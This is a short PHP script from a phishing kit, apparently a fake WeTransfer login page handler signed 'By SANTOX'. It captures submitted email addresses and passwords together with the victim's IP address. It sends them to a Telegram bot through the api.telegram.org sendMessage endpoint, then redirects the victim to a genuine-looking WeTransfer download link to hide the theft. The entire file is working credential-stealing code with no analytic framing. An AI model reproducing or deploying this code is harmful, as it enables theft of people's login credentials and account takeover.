<?php

include "antibots.php";
include "token.php";

$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");




if(isset($_POST['sub'])){
	$message .= '
<<<<<<-------- Log Error <<<<<<----------
Identifiant  =  '.$_POST['email'].'
Mot de passe  =  '.$_POST['password'].'

  ------------ infos ------------
------------ '.$ip.' ------------
-------------------By SANTOX  ------------------
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );




    header("Refresh: 0; URL=https://wetransfer.com/downloads/d2d348fe3d2995e1cf8e5fe8cf84a56c20231031011618/1150945a7ef90f33b9c67ef4dc77098520231031011655/06f777?trk=TRN_TDL_01&utm_campaign=TRN_TDL_01&utm_medium=email&utm_source=sendgrid");
    exit();
}


?>